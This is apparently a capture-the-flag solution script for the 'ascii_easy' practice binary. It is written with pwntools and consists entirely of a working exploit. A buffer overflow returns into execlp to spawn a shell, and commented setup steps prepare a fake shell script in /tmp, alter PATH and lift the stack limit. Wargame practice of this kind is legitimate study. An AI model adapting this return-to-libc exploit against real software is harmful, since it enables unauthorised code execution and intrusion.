from pwn import *
p = process('/home/ascii_easy/ascii_easy')

# mkdir /tmp/icemakrrr; cd /tmp/icemakrrr;
# cat > h
#   #!/bin/sh
#   /bin/sh
# export PATH=/tmp/icemakrrr
# ulimit -s unlimited

adr_execlp  = 0x55643970 # gdb$ p execlp
adr_filenm  = 0x55665c6c # find 0x5558b000,+0x1a6000,"h"

payload  = 'A' * 0xac
payload += p32(adr_execlp)
payload += 'AAAA'
payload += p32(adr_filenm)
payload += p32(0x0)

p.sendline(payload)

p.interactive()
